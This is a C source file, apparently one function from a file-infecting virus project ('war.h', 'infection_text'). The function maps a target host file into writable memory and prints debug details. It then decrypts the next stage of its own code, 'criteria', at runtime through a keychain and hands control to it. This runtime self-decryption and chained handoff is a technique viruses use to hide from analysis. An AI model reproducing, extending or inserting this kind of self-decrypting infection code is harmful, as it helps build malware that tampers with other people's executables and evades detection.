#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void host_constructor(struct s_host *host, struct s_keychain *keychain, const char *filename)
{
	int fd;
	struct stat statbuf;

	if ((fd = open(filename, O_RDONLY, 0000)) < 0)
	{
		perror("open");
		exit(1);
	}
	if (stat(filename, &statbuf) < 0)
	{
		perror("stat");
		exit(1);
	}
	if ((host->header = mmap(NULL, statbuf.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
	{
		perror("mmap");
		exit(1);
	}

	host->filename = filename;
	host->filesize = statbuf.st_size;

	close(fd);

	printf("%p\n", host->header);
	printf("%s\n", host->filename);
	printf("%ld\n", host->filesize);
	printf("\n");

	update_keychain_right(keychain, (char *)host_constructor, (void *)criteria - (void *)host_constructor);
	decrypt_right(keychain, (char *)criteria, (void *)infection_text - (void *)criteria);

	criteria(host, keychain);
}
